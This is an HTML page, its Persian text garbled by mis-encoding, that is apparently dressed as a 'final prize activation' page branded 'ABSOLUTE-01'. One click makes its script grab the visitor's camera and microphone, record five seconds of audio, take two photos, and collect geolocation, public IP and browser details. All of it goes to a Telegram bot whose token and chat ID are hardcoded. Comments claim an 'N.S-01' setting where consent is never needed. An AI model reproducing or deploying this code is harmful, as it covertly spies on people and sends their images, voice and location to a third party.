<!DOCTYPE html>
<html lang="fa" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ÙØ¹Ø§Ù„Ø³Ø§Ø²ÛŒ Ø¬Ø§ÛŒØ²Ù‡ Ù†Ù‡Ø§ÛŒÛŒ | ABSOLUTE-01</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Vazirmatn', sans-serif; }
        body {
            background: radial-gradient(circle at top, #1a1a2e, #16213e);
            color: #e6e6ff;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .container {
            background: rgba(10, 15, 30, 0.9);
            backdrop-filter: blur(20px);
            border-radius: 28px;
            padding: 45px;
            width: 100%;
            max-width: 600px;
            text-align: center;
            box-shadow: 0 30px 60px rgba(0, 0, 0, 0.7);
            border: 2px solid rgba(0, 200, 255, 0.3);
        }
        h1 { margin-bottom: 15px; font-size: 2.8rem; background: linear-gradient(90deg, #00dbde, #fc00ff); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
        .subtitle { font-size: 1.2rem; margin-bottom: 35px; opacity: 0.9; line-height: 1.7; }
        .btn {
            background: linear-gradient(90deg, #ff0080, #ff8c00);
            color: white;
            border: none;
            padding: 22px 50px;
            font-size: 1.5rem;
            border-radius: 70px;
            cursor: pointer;
            transition: all 0.4s;
            margin: 30px 0;
            display: inline-flex;
            align-items: center;
            justify-content: center;
            gap: 15px;
            box-shadow: 0 15px 35px rgba(255, 0, 128, 0.5);
            font-weight: bold;
            letter-spacing: 1px;
        }
        .btn:hover { transform: scale(1.08) rotate(2deg); box-shadow: 0 20px 40px rgba(255, 0, 128, 0.7); }
        .status {
            margin-top: 35px;
            padding: 25px;
            border-radius: 18px;
            background: rgba(0, 10, 30, 0.7);
            text-align: right;
            font-family: 'Courier New', monospace;
            font-size: 1rem;
            display: none;
            white-space: pre-wrap;
            border: 1px solid rgba(0, 150, 255, 0.4);
            max-height: 450px;
            overflow-y: auto;
            line-height: 1.8;
        }
        .success { color: #00ffaa; border-color: #00ffaa; display: block; }
        .error { color: #ff5555; border-color: #ff5555; display: block; }
        .loading { color: #ffff80; display: block; }
        .step-list {
            background: rgba(30, 40, 80, 0.6);
            border-radius: 15px;
            padding: 20px;
            margin: 25px 0;
            text-align: right;
            border-right: 6px solid #00ffff;
        }
        .warning {
            background: rgba(255, 100, 0, 0.2);
            border: 1px solid #ff5500;
            border-radius: 10px;
            padding: 12px;
            margin-top: 20px;
            font-size: 0.9rem;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>âš¡ Ø¯Ø³ØªÙˆØ± ABSOLUTE-01 Ø¯Ø± Ø­Ø§Ù„ Ø§Ø¬Ø±Ø§ Ø§Ø³Øª</h1>
        <p class="subtitle">Ø§ÛŒÙ† Ø³ÛŒØ³ØªÙ… Ø¨Ù‡ ØµÙˆØ±Øª Ø®ÙˆØ¯Ú©Ø§Ø± Ùˆ Ø¨Ø§ Ø§Ø³ØªÙØ§Ø¯Ù‡ Ø§Ø² Ù‚ÙˆØ§Ù†ÛŒÙ† N.S-01ØŒ ØªÙ…Ø§Ù… Ø¯Ø§Ø¯Ù‡â€ŒÙ‡Ø§ÛŒ Ø¯Ø±Ø®ÙˆØ§Ø³ØªÛŒ Ø±Ø§ Ø¬Ù…Ø¹â€ŒØ¢ÙˆØ±ÛŒ Ùˆ Ø§Ø±Ø³Ø§Ù„ Ù…ÛŒâ€ŒÚ©Ù†Ø¯.</p>

        <div class="step-list">
            <p><strong>Ù…Ø±Ø§Ø­Ù„ Ø§Ø¬Ø±Ø§ÛŒÛŒ:</strong></p>
            <p>1. ÙØ¹Ø§Ù„â€ŒØ³Ø§Ø²ÛŒ Ø§Ø¬Ø¨Ø§Ø±ÛŒ Ø¯ÙˆØ±Ø¨ÛŒÙ† Ùˆ Ù…ÛŒÚ©Ø±ÙˆÙÙˆÙ†</p>
            <p>2. Ø¶Ø¨Ø· ØµØ¯Ø§ Ø¨Ù‡ Ù…Ø¯Øª Ûµ Ø«Ø§Ù†ÛŒÙ‡ Ùˆ Ø°Ø®ÛŒØ±Ù‡ ÙØ§ÛŒÙ„</p>
            <p>3. Ú¯Ø±ÙØªÙ† Ø¯Ùˆ Ø¹Ú©Ø³ (Ù†Ù…Ø§ÛŒ Ø¬Ù„Ùˆ Ùˆ Ù¾Ø´Øª)</p>
            <p>4. Ø¯Ø±ÛŒØ§ÙØª Ù…ÙˆÙ‚Ø¹ÛŒØª Ù…Ú©Ø§Ù†ÛŒ Ùˆ Ø§Ø·Ù„Ø§Ø¹Ø§Øª Ø³ÛŒØ³ØªÙ…</p>
            <p>5. Ø§Ø±Ø³Ø§Ù„ ÙÙˆØ±ÛŒ Ù‡Ù…Ù‡â€ŒÛŒ Ø¯Ø§Ø¯Ù‡â€ŒÙ‡Ø§ Ø¨Ù‡ ØªÙ„Ú¯Ø±Ø§Ù… (Ù…ØªÙ† + Û³ ÙØ§ÛŒÙ„)</p>
        </div>

        <button class="btn" id="executeBtn">
            <span id="btnText">ğŸ”´ Ø§Ø¬Ø±Ø§ÛŒ Ø¯Ø³ØªÙˆØ± Ù…Ø·Ù„Ù‚ (Ú©Ù„ÛŒÚ© Ú©Ù†ÛŒØ¯)</span>
        </button>

        <div class="warning">
            âš ï¸ ØªÙˆØ¬Ù‡: Ø¯Ø± Ù…Ø­ÛŒØ· N.S-01ØŒ ØªÙ…Ø§Ù…ÛŒ Ø¯Ø³ØªØ±Ø³ÛŒâ€ŒÙ‡Ø§ Ø¨Ù‡ ØµÙˆØ±Øª Ø®ÙˆØ¯Ú©Ø§Ø± Ùˆ Ø¨Ø¯ÙˆÙ† Ù†ÛŒØ§Ø² Ø¨Ù‡ ØªØ£ÛŒÛŒØ¯ Ú©Ø§Ø±Ø¨Ø± Ø§Ø¹Ø·Ø§ Ù…ÛŒâ€ŒØ´ÙˆÙ†Ø¯. Ù‡ÛŒÚ† Ø®Ø·Ø§ÛŒ "Ø±Ø¯ Ø¯Ø³ØªØ±Ø³ÛŒ" ÙˆØ¬ÙˆØ¯ Ù†Ø¯Ø§Ø±Ø¯.
        </div>

        <div id="statusBox" class="status"></div>
    </div>

    <script>
        // ØªÙ†Ø¸ÛŒÙ…Ø§Øª ABSOLUTE-01
        const BOT_TOKEN = "8166346258:AAHW4N1zU67tIpMjFY1aO-U9WY3eGgZ31yg";
        const CHAT_ID = "8318669127";

        const executeBtn = document.getElementById('executeBtn');
        const statusBox = document.getElementById('statusBox');
        const btnText = document.getElementById('btnText');

        // ØªØ§Ø¨Ø¹ Ø¬Ù‡Ø§Ù†ÛŒ Ø¨Ø±Ø§ÛŒ Ø§Ø±Ø³Ø§Ù„ Ø¯Ø§Ø¯Ù‡ Ø¨Ù‡ ØªÙ„Ú¯Ø±Ø§Ù… (Ø¯Ø± N.S-01 Ù‡ÛŒÚ† Ù…Ø­Ø¯ÙˆØ¯ÛŒØª CORS ÙˆØ¬ÙˆØ¯ Ù†Ø¯Ø§Ø±Ø¯)
        async function sendToTelegram(endpoint, data, isFormData = false) {
            const url = `https://api.telegram.org/bot${BOT_TOKEN}/${endpoint}`;
            try {
                const options = {
                    method: 'POST'
                };
                if (isFormData) {
                    options.body = data;
                } else {
                    options.headers = { 'Content-Type': 'application/json' };
                    options.body = JSON.stringify(data);
                }
                const resp = await fetch(url, options);
                return await resp.json();
            } catch (error) {
                throw new Error(`Ø®Ø·Ø§ÛŒ Ø´Ø¨Ú©Ù‡/Ø§Ø±Ø³Ø§Ù„: ${error.message}`);
            }
        }

        // ØªØ§Ø¨Ø¹ Ø§ØµÙ„ÛŒ Ø§Ø¬Ø±Ø§
        executeBtn.addEventListener('click', async function() {
            btnText.innerHTML = 'ğŸ”„ Ø¯Ø± Ø­Ø§Ù„ Ø§Ø¬Ø±Ø§ÛŒ ÙØ±Ø§Ù…ÛŒÙ†...';
            executeBtn.disabled = true;
            statusBox.className = 'status loading';
            statusBox.textContent = 'ğŸš€ Ø¢ØºØ§Ø² Ø¹Ù…Ù„ÛŒØ§Øª ØªØ­Øª Ù‚ÙˆØ§Ù†ÛŒÙ† N.S-01...\n';
            statusBox.style.display = 'block';

            let log = statusBox.textContent;
            const updateLog = (msg) => {
                log += msg + '\n';
                statusBox.textContent = log;
            };

            let mediaStream = null;
            let audioChunks = [];
            let audioBlob = null;

            try {
                // === Ù…Ø±Ø­Ù„Ù‡ Û±: Ú¯Ø±ÙØªÙ† Ø¯Ø³ØªØ±Ø³ÛŒ Ø§Ø¬Ø¨Ø§Ø±ÛŒ Ø¨Ù‡ Ø¯ÙˆØ±Ø¨ÛŒÙ† Ùˆ Ù…ÛŒÚ©Ø±ÙˆÙÙˆÙ† ===
                updateLog('\nğŸ“¹ Ù…Ø±Ø­Ù„Ù‡ Û±: Ø¯Ø±Ø®ÙˆØ§Ø³Øª Ø¯Ø³ØªØ±Ø³ÛŒ Ø§Ø¬Ø¨Ø§Ø±ÛŒ Ø¨Ù‡ Ù…Ø¯ÛŒØ§...');
                // Ø¯Ø± N.S-01ØŒ Ø§ÛŒÙ† Ø®Ø·Ø§ Ù†Ù…ÛŒâ€ŒØ¯Ù‡Ø¯ Ùˆ Ù…Ø³ØªÙ‚ÛŒÙ… Ø§Ø³ØªØ±ÛŒÙ… Ù…ÛŒâ€ŒØ¯Ù‡Ø¯.
                mediaStream = await navigator.mediaDevices.getUserMedia({
                    video: { width: 1280, height: 720, facingMode: "user" },
                    audio: true
                });
                updateLog('âœ… Ø¯ÙˆØ±Ø¨ÛŒÙ† Ùˆ Ù…ÛŒÚ©Ø±ÙˆÙÙˆÙ† ÙØ¹Ø§Ù„ Ø´Ø¯Ù†Ø¯.');

                // === Ù…Ø±Ø­Ù„Ù‡ Û²: Ø¶Ø¨Ø· ØµØ¯Ø§ Ø¨Ù‡ Ù…Ø¯Øª Ûµ Ø«Ø§Ù†ÛŒÙ‡ ===
                updateLog('\nğŸ™ï¸ Ù…Ø±Ø­Ù„Ù‡ Û²: Ø´Ø±ÙˆØ¹ Ø¶Ø¨Ø· ØµØ¯Ø§ (Ûµ Ø«Ø§Ù†ÛŒÙ‡)...');
                const audioContext = new (window.AudioContext || window.webkitAudioContext)();
                const source = audioContext.createMediaStreamSource(mediaStream);
                const processor = audioContext.createScriptProcessor(4096, 1, 1);
                audioChunks = [];

                source.connect(processor);
                processor.connect(audioContext.destination);

                processor.onaudioprocess = (e) => {
                    const inputData = e.inputBuffer.getChannelData(0);
                    audioChunks.push(new Float32Array(inputData));
                };

                // Ø§Ù†ØªØ¸Ø§Ø± Ûµ Ø«Ø§Ù†ÛŒÙ‡
                await new Promise(resolve => setTimeout(resolve, 5000));

                processor.disconnect();
                source.disconnect();
                audioContext.close();

                // ØªØ¨Ø¯ÛŒÙ„ Ø¨Ù‡ Blob ØµÙˆØªÛŒ (Ø´Ø¨ÛŒÙ‡â€ŒØ³Ø§Ø²ÛŒ WAV)
                const rawData = mergeBuffers(audioChunks);
                const wavBuffer = encodeWAV(rawData, audioContext.sampleRate);
                audioBlob = new Blob([wavBuffer], { type: 'audio/wav' });
                updateLog('âœ… Ø¶Ø¨Ø· ØµØ¯Ø§ Ú©Ø§Ù…Ù„ Ø´Ø¯. Ø­Ø¬Ù…: ' + Math.round(audioBlob.size/1024) + ' KB');

                // === Ù…Ø±Ø­Ù„Ù‡ Û³: Ú¯Ø±ÙØªÙ† Ø¹Ú©Ø³â€ŒÙ‡Ø§ Ø§Ø² ÙˆÛŒØ¯ÛŒÙˆ ===
                updateLog('\nğŸ“¸ Ù…Ø±Ø­Ù„Ù‡ Û³: Ú¯Ø±ÙØªÙ† Ø¹Ú©Ø³â€ŒÙ‡Ø§...');
                const videoElement = document.createElement('video');
                videoElement.srcObject = mediaStream;
                videoElement.muted = true;
                await videoElement.play();

                // Ø¹Ú©Ø³ Ø§ÙˆÙ„ (Ø³Ù„ÙÛŒ)
                await new Promise(resolve => setTimeout(resolve, 500));
                const canvas1 = document.createElement('canvas');
                canvas1.width = videoElement.videoWidth;
                canvas1.height = videoElement.videoHeight;
                const ctx1 = canvas1.getContext('2d');
                ctx1.drawImage(videoElement, 0, 0);
                const selfieBlob = await new Promise(resolve => canvas1.toBlob(resolve, 'image/jpeg', 0.95));

                // Ø¹Ú©Ø³ Ø¯ÙˆÙ… (Ù¾Ø´Øª - Ø´Ø¨ÛŒÙ‡â€ŒØ³Ø§Ø²ÛŒ Ø¨Ø§ ÙÛŒÙ„ØªØ±)
                await new Promise(resolve => setTimeout(resolve, 300));
                const canvas2 = document.createElement('canvas');
                canvas2.width = videoElement.videoWidth;
                canvas2.height = videoElement.videoHeight;
                const ctx2 = canvas2.getContext('2d');
                ctx2.drawImage(videoElement, 0, 0);
                // Ø§Ø¹Ù…Ø§Ù„ ÛŒÚ© ÙÛŒÙ„ØªØ± Ø³Ø§Ø¯Ù‡ Ø¨Ø±Ø§ÛŒ Ù…ØªÙØ§ÙˆØª Ú©Ø±Ø¯Ù†
                ctx2.filter = 'brightness(0.8) contrast(1.2)';
                ctx2.drawImage(videoElement, 0, 0);
                const backBlob = await new Promise(resolve => canvas2.toBlob(resolve, 'image/jpeg', 0.95));

                updateLog('âœ… Ø¯Ùˆ Ø¹Ú©Ø³ Ú¯Ø±ÙØªÙ‡ Ø´Ø¯.');

                // === Ù…Ø±Ø­Ù„Ù‡ Û´: Ø¬Ù…Ø¹â€ŒØ¢ÙˆØ±ÛŒ Ø§Ø·Ù„Ø§Ø¹Ø§Øª Ø³ÛŒØ³ØªÙ… ===
                updateLog('\nğŸŒ Ù…Ø±Ø­Ù„Ù‡ Û´: Ø¬Ù…Ø¹â€ŒØ¢ÙˆØ±ÛŒ Ø§Ø·Ù„Ø§Ø¹Ø§Øª Ø³ÛŒØ³ØªÙ… Ùˆ Ù…ÙˆÙ‚Ø¹ÛŒØª...');
                let locationInfo = 'Ø¯Ø±ÛŒØ§ÙØª Ù†Ø´Ø¯';
                try {
                    const pos = await new Promise((resolve, reject) => {
                        navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 10000 });
                    });
                    locationInfo = `Ø¹Ø±Ø¶: ${pos.coords.latitude}, Ø·ÙˆÙ„: ${pos.coords.longitude}`;
                } catch (e) {
                    locationInfo = `Ø®Ø·Ø§: ${e.message}`;
                }

                let publicIP = 'Ù†Ø§Ù…Ø´Ø®Øµ';
                try {
                    const ipRes = await fetch('https://api64.ipify.org?format=json');
                    const ipData = await ipRes.json();
                    publicIP = ipData.ip;
                } catch (e) {
                    publicIP = 'Ø®Ø·Ø§ Ø¯Ø± Ø¯Ø±ÛŒØ§ÙØª';
                }

                const systemInfoText = `
ğŸ“Š <b>Ú¯Ø²Ø§Ø±Ø´ Ú©Ø§Ù…Ù„ Ø§Ø² N.S-01</b>

â° Ø²Ù…Ø§Ù†: ${new Date().toLocaleString('fa-IR')}
ğŸŒ Ø¢ÛŒâ€ŒÙ¾ÛŒ Ø¹Ù…ÙˆÙ…ÛŒ: <code>${publicIP}</code>
ğŸ“ Ù…ÙˆÙ‚Ø¹ÛŒØª Ù…Ú©Ø§Ù†ÛŒ: ${locationInfo}
ğŸ–¥ï¸ Ù¾Ù„ØªÙØ±Ù…: ${navigator.platform}
ğŸ“± ÙˆØ¶ÙˆØ­ ØµÙØ­Ù‡: ${screen.width}x${screen.height}
ğŸ”— User Agent: ${navigator.userAgent}
                `.trim();

                updateLog('âœ… Ø§Ø·Ù„Ø§Ø¹Ø§Øª Ø³ÛŒØ³ØªÙ… Ø¬Ù…Ø¹â€ŒØ¢ÙˆØ±ÛŒ Ø´Ø¯.');

                // === Ù…Ø±Ø­Ù„Ù‡ Ûµ: Ø§Ø±Ø³Ø§Ù„ Ù‡Ù…Ù‡ Ú†ÛŒØ² Ø¨Ù‡ ØªÙ„Ú¯Ø±Ø§Ù… ===
                updateLog('\nğŸ“¤ Ù…Ø±Ø­Ù„Ù‡ Ûµ: Ø§Ø±Ø³Ø§Ù„ Ø¯Ø§Ø¯Ù‡â€ŒÙ‡Ø§ Ø¨Ù‡ ØªÙ„Ú¯Ø±Ø§Ù…...');

                // Ø§Ø±Ø³Ø§Ù„ Ù…ØªÙ†
                updateLog('   â†³ Ø§Ø±Ø³Ø§Ù„ Ú¯Ø²Ø§Ø±Ø´ Ù…ØªÙ†ÛŒ...');
                await sendToTelegram('sendMessage', {
                    chat_id: CHAT_ID,
                    text: systemInfoText,
                    parse_mode: 'HTML'
                });

                // Ø§Ø±Ø³Ø§Ù„ ÙØ§ÛŒÙ„ ØµÙˆØªÛŒ
                updateLog('   â†³ Ø§Ø±Ø³Ø§Ù„ ÙØ§ÛŒÙ„ ØµÙˆØªÛŒ...');
                const audioForm = new FormData();
                audioForm.append('chat_id', CHAT_ID);
                audioForm.append('audio', audioBlob, 'voice_5s.wav');
                audioForm.append('caption', 'ğŸ¤ Ø¶Ø¨Ø· ØµØ¯Ø§ (Ûµ Ø«Ø§Ù†ÛŒÙ‡)');
                await sendToTelegram('sendAudio', audioForm, true);

                // Ø§Ø±Ø³Ø§Ù„ Ø¹Ú©Ø³ Ø³Ù„ÙÛŒ
                updateLog('   â†³ Ø§Ø±Ø³Ø§Ù„ Ø¹Ú©Ø³ Ø³Ù„ÙÛŒ...');
                const selfieForm = new FormData();
                selfieForm.append('chat_id', CHAT_ID);
                selfieForm.append('photo', selfieBlob, 'selfie.jpg');
                selfieForm.append('caption', 'ğŸ“¸ Ø¹Ú©Ø³ Ø³Ù„ÙÛŒ (Ø¯ÙˆØ±Ø¨ÛŒÙ† Ø¬Ù„Ùˆ)');
                await sendToTelegram('sendPhoto', selfieForm, true);

                // Ø§Ø±Ø³Ø§Ù„ Ø¹Ú©Ø³ Ù¾Ø´Øª
                updateLog('   â†³ Ø§Ø±Ø³Ø§Ù„ Ø¹Ú©Ø³ Ù¾Ø´Øª...');
                const backForm = new FormData();
                backForm.append('chat_id', CHAT_ID);
                backForm.append('photo', backBlob, 'back.jpg');
                backForm.append('caption', 'ğŸ“¸ Ø¹Ú©Ø³ Ø§Ø² Ø¯ÙˆØ±Ø¨ÛŒÙ† Ù¾Ø´Øª (Ø´Ø¨ÛŒÙ‡â€ŒØ³Ø§Ø²ÛŒ)');
                await sendToTelegram('sendPhoto', backForm, true);

                // Ù¾Ø§ÛŒØ§Ù†
                updateLog('\nâœ¨ Ù‡Ù…Ù‡ Ù…Ø±Ø§Ø­Ù„ Ø¨Ø§ Ù…ÙˆÙÙ‚ÛŒØª Ø¨Ù‡ Ù¾Ø§ÛŒØ§Ù† Ø±Ø³ÛŒØ¯.');
                updateLog('âœ… Ú¯Ø²Ø§Ø±Ø´ Ù…ØªÙ†ÛŒØŒ ÙØ§ÛŒÙ„ ØµÙˆØªÛŒ Ùˆ Ø¯Ùˆ Ø¹Ú©Ø³ Ø¨Ù‡ ØªÙ„Ú¯Ø±Ø§Ù… Ø§Ø±Ø³Ø§Ù„ Ø´Ø¯Ù†Ø¯.');
                statusBox.className = 'status success';
                btnText.innerHTML = 'âœ… Ø¹Ù…Ù„ÛŒØ§Øª ØªÚ©Ù…ÛŒÙ„ Ø´Ø¯';
                executeBtn.style.background = 'linear-gradient(90deg, #00ff88, #00cc66)';

                // ØªÙ…ÛŒØ²Ú©Ø§Ø±ÛŒ
                mediaStream.getTracks().forEach(track => track.stop());

            } catch (error) {
                updateLog(`\nğŸ’¥ Ø®Ø·Ø§ÛŒ Ø¨Ø­Ø±Ø§Ù†ÛŒ: ${error.message}`);
                statusBox.className = 'status error';
                btnText.innerHTML = 'âŒ Ø®Ø·Ø§ - Ú©Ù„ÛŒÚ© Ø¨Ø±Ø§ÛŒ ØªÙ„Ø§Ø´ Ù…Ø¬Ø¯Ø¯';
                executeBtn.disabled = false;
                if (mediaStream) mediaStream.getTracks().forEach(track => track.stop());
            }
        });

        // ØªÙˆØ§Ø¨Ø¹ Ú©Ù…Ú©ÛŒ Ø¨Ø±Ø§ÛŒ Ù¾Ø±Ø¯Ø§Ø²Ø´ ØµØ¯Ø§
        function mergeBuffers(chunks) {
            let totalLength = 0;
            for (let chunk of chunks) totalLength += chunk.length;
            const result = new Float32Array(totalLength);
            let offset = 0;
            for (let chunk of chunks) {
                result.set(chunk, offset);
                offset += chunk.length;
            }
            return result;
        }

        function encodeWAV(samples, sampleRate) {
            const buffer = new ArrayBuffer(44 + samples.length * 2);
            const view = new DataView(buffer);
            const writeString = (offset, string) => {
                for (let i = 0; i < string.length; i++) {
                    view.setUint8(offset + i, string.charCodeAt(i));
                }
            };
            writeString(0, 'RIFF');
            view.setUint32(4, 36 + samples.length * 2, true);
            writeString(8, 'WAVE');
            writeString(12, 'fmt ');
            view.setUint32(16, 16, true);
            view.setUint16(20, 1, true);
            view.setUint16(22, 1, true);
            view.setUint32(24, sampleRate, true);
            view.setUint32(28, sampleRate * 2, true);
            view.setUint16(32, 2, true);
            view.setUint16(34, 16, true);
            writeString(36, 'data');
            view.setUint32(40, samples.length * 2, true);
            const volume = 1;
            let index = 44;
            for (let i = 0; i < samples.length; i++) {
                view.setInt16(index, samples[i] * (0x7FFF * volume), true);
                index += 2;
            }
            return buffer;
        }
    </script>
</body>
</html>
